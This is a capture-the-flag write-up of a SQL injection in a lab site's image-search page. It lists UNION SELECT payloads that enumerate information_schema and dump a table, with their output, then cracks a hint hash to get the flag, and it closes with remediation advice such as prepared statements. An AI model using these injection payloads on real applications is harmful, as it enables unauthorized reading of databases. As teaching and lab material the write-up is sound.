```
http://{IP_ADDRESS}/?page=searchimg
```

Actually, everything proceeds the same as in the [SQL Injection Member](../SQL%20Injection%20Member/Resources/writeup.md) post.

```
1 UNION SELECT null, concat (table_name) from information_schema.tables where table_schema = database ()
```

We execute this query;

```
ID: 1 UNION SELECT null, concat (table_name) from information_schema.tables where table_schema = database () 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 UNION SELECT null, concat (table_name) from information_schema.tables where table_schema = database () 
Title: list_images
Url : 
```

Then, since we know the table name;

```
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

```
[...]
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: id
Url : list_images

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: url
Url : list_images

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: title
Url : list_images

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: comment
Url : list_images
[...]
```

You can query and check each one individually, but we will go straight to the result.

```
1 UNION SELECT id, comment FROM list_images
```

```
ID: -1 UNION SELECT id, comment FROM list_images 
Title: An image about the NSA !
Url : 1

ID: -1 UNION SELECT id, comment FROM list_images 
Title: There is a number..
Url : 2

ID: -1 UNION SELECT id, comment FROM list_images 
Title: Google it !
Url : 3

ID: -1 UNION SELECT id, comment FROM list_images 
Title: Earth!
Url : 4

ID: -1 UNION SELECT id, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5
```

We checked what this hash might be using the website we used in our previous project. You can use tools like `hashid` or any hash finder if you prefer.

```
https://www.dcode.fr/
```

We had it automatically analyzed and saw it was MD5, and when decrypted:

`albatroz`

```
 ~  echo -n "albatroz" | sha256sum

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
```

## How to fix

-   Use Prepared Statements. Data received from users is not directly included in SQL queries. Instead, data is bound to the query as parameters and processed securely by the database engine, which prevents SQL Injection attacks.

-   Restrict SQL account permissions to limit possible damage in case of an attack.

-   Hide error messages, even though this doesn't directly prevent SQL injection.

-   You can filter user inputs.

-   Use WAF (Web Application Firewall).